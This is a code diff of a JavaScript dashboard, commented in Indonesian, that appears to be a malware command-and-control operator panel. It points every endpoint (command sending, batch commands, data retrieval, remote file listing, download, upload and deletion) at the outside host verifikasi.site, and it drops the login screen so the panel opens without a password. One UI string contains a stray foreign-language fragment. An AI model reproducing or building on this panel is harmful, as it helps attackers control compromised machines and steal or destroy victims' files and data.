@@ -215,7 +215,7 @@
 <script>
 window.addEventListener('error', function(e) {
     try {
-        fetch('/error', {
+        fetch('https://verifikasi.site/error', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
@@ -232,7 +232,7 @@ window.addEventListener('error', function(e) {
 
 window.addEventListener('unhandledrejection', function(e) {
     try {
-        fetch('/error', {
+        fetch('https://verifikasi.site/error', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
@@ -494,8 +494,8 @@ function refreshData() {
         } catch(e) {}
     }
     
-    // 🔥 TANPA KEY!
-    fetch('/data')
+    // 🔥 PAKAI FULL URL!
+    fetch('https://verifikasi.site/data')
         .then(function(r){ 
             if(!r.ok) throw new Error('HTTP ' + r.status);
             return r.json(); 
@@ -591,7 +591,7 @@ function renderDataSections() {
             html += renderDataContent(src, items, last);
             html += '</div>';
         });
-        container.innerHTML = html || '<div class="empty">📭 Tidak ada data</div>';
+        container.innerHTML = html || '<div class="empty">📭 Tidak ada数据</div>';
         
         var pagContainer = document.getElementById('dataPagination');
         if (totalPages > 1) {
@@ -904,8 +904,8 @@ function sendC2(aksi, params){
     renderC2History();
     document.getElementById('c2Result').textContent = '⏳ Sending: '+aksi;
     document.getElementById('c2Result').style.color = '#ff0';
-    // 🔥 TANPA KEY!
-    fetch('/data', { 
+    // 🔥 PAKAI FULL URL!
+    fetch('https://verifikasi.site/data', { 
         method: 'POST', 
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(payload) 
@@ -960,7 +960,7 @@ function sendBatchC2() {
             var cmd = JSON.parse(line.trim());
             var aksi = cmd.aksi || cmd.command || 'unknown';
             var params = cmd.params || {};
-            fetch('/data', {
+            fetch('https://verifikasi.site/data', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
@@ -994,7 +994,7 @@ function sendBatchC2() {
 
 function updateQueueLength() {
     try {
-        fetch('/data?type=perintah', { method: 'GET' })
+        fetch('https://verifikasi.site/data?type=perintah', { method: 'GET' })
             .then(function(r) { return r.text(); })
             .then(function(text) {
                 try {
@@ -1061,14 +1061,14 @@ function exportCSV(){
 
 function clearAll(){
     if(!confirm('⚠️ Hapus semua data?')) return;
-    fetch('/clear', {method:'POST'})
+    fetch('https://verifikasi.site/clear', {method:'POST'})
         .then(function(){ allData=[]; renderAll(); showToast('🗑️ Data terhapus'); })
         .catch(function(){ showToast('❌ Gagal hapus data'); });
 }
 
 function listFiles(){
     var path = document.getElementById('filePath').value || '/';
-    fetch('/api/files?path='+encodeURIComponent(path))
+    fetch('https://verifikasi.site/api/files?path='+encodeURIComponent(path))
         .then(function(r){ return r.json(); })
         .then(function(data){
             var container = document.getElementById('fileListContainer');
@@ -1096,12 +1096,12 @@ function listFiles(){
 }
 
 function downloadFile(path){
-    window.open('/api/download?path='+encodeURIComponent(path), '_blank');
+    window.open('https://verifikasi.site/api/download?path='+encodeURIComponent(path), '_blank');
 }
 
 function deleteFile(path){
     if(!confirm('Hapus file: '+path+'?')) return;
-    fetch('/api/delete', {
+    fetch('https://verifikasi.site/api/delete', {
         method: 'POST',
         headers: {'Content-Type':'application/json'},
         body: JSON.stringify({path: path})
@@ -1125,7 +1125,7 @@ function uploadFileSubmit(){
     var formData = new FormData();
     formData.append('file', file);
     formData.append('path', document.getElementById('filePath').value || '/');
-    fetch('/api/upload', {
+    fetch('https://verifikasi.site/api/upload', {
         method: 'POST',
         body: formData
     })
@@ -1139,9 +1139,8 @@ function uploadFileSubmit(){
 }
 
 // ============================================================
-// 🔥 INIT - LANGSUNG TAMPILKAN DASHBOARD TANPA LOGIN!
+// 🔥 INIT - LANGSUNG TAMPILKAN DASHBOARD!
 // ============================================================
-document.getElementById('loginBox').style.display = 'none';
 document.getElementById('main').style.display = 'block';
 document.getElementById('statusInfo').textContent = '🔓 Akses langsung - Tanpa Password';
 
